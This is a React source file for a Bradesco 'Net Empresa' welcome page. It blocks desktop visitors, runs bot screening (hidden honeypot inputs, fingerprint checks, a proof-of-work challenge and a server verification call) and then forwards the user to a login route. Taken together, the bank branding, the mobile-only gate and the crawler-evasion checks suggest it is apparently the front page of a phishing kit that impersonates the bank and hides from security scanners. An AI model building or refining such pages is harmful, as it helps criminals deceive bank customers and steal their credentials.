import { useNavigate } from "react-router-dom";
import { useState, useEffect, useRef } from "react";
import bradescoLogo from "@/assets/bradesco-logo.png";
import { markSessionStarted } from "@/hooks/useRouteGuard";
import { supabase } from "@/integrations/supabase/client";
import {
  markPageLoad,
  startInteractionTracking,
  stopInteractionTracking,
  setHoneypotValue,
  runClientSideValidation,
  generateChallenge,
  solveProofOfWork,
} from "@/lib/botProtection";

const WelcomePage = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const honeypotRef = useRef<HTMLInputElement>(null);

  // Start tracking on mount
  useEffect(() => {
    markPageLoad();
    startInteractionTracking();
    return () => stopInteractionTracking();
  }, []);

  const handleClick = async () => {
    if (loading) return;
    setLoading(true);

    if (honeypotRef.current) {
      setHoneypotValue(honeypotRef.current.value);
    }

    const validation = runClientSideValidation();

    if (!validation.valid) {
      console.error("Validação local falhou:", validation.checks);
      setLoading(false);
      return;
    }

    // Solve Proof of Work challenge
    const challenge = generateChallenge();
    const pow = await solveProofOfWork(challenge, 4);

    try {
      const { data, error } = await supabase.functions.invoke("verify-bot-protection", {
        body: {
          fingerprint: validation.fingerprint,
          checks: validation.checks,
          botReasons: validation.botReasons,
          pow: { challenge, nonce: pow.nonce, hash: pow.hash },
        },
      });

      if (error || !data?.success) {
        console.error("Verificação falhou:", error || data);
        setLoading(false);
        return;
      }

      sessionStorage.setItem("session_proof", data.sessionProof);
      sessionStorage.setItem("session_sig", data.signature);
      markSessionStarted();
      navigate("/login");
    } catch (err) {
      console.error("Erro ao verificar:", err);
      setLoading(false);
    }
  };
  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-gradient-to-b from-[hsl(220,70%,45%)] to-[hsl(349,93%,42%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">
            Este portal está disponível apenas para dispositivos móveis. Por favor, acesse pelo seu smartphone.
          </p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-[hsl(220,70%,45%)] via-[hsl(280,40%,45%)] to-[hsl(349,93%,42%)]" />

        <div className="absolute bottom-0 right-0 w-[120%] h-[55%] opacity-30">
          <div className="absolute bottom-0 right-[-10%] w-[90%] h-full rounded-tl-[60%] bg-[hsl(330,60%,50%)]" />
          <div className="absolute bottom-[-10%] left-[-5%] w-[80%] h-[80%] rounded-tr-[50%] bg-[hsl(280,50%,50%)]" />
        </div>

        <div className="relative z-10 flex flex-col flex-1 items-center justify-center px-8">
          {/* Logo / Brand */}
          <div className="flex flex-col items-center gap-6 mb-auto mt-auto">
            <img
              src={bradescoLogo}
              alt="Bradesco"
              className="w-44 h-44 object-contain drop-shadow-lg"
            />
          </div>

          {/* Bottom button */}
          <div className="w-full pb-12 space-y-4">
            {/* Honeypot trap - invisible to users, bots auto-fill it */}
            <div
              aria-hidden="true"
              style={{
                position: "absolute",
                left: "-9999px",
                top: "-9999px",
                width: 0,
                height: 0,
                overflow: "hidden",
                opacity: 0,
                pointerEvents: "none",
              }}
            >
              <label htmlFor="website_url">Website</label>
              <input
                ref={honeypotRef}
                type="text"
                id="website_url"
                name="website_url"
                autoComplete="off"
                tabIndex={-1}
              />
              <label htmlFor="user_phone">Phone</label>
              <input
                type="text"
                id="user_phone"
                name="user_phone"
                autoComplete="off"
                tabIndex={-1}
              />
            </div>

            <button
              onClick={handleClick}
              disabled={loading}
              className="w-full h-14 rounded-full bg-white text-[hsl(220,70%,45%)] text-base font-bold tracking-wide active:scale-[0.97] transition-all duration-200 shadow-lg disabled:opacity-70"
            >
              {loading ? "Verificando..." : "Iniciar login"}
            </button>
            <p className="text-white/40 text-xs text-center">
              Acesso exclusivo para clientes Net Empresa
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default WelcomePage;
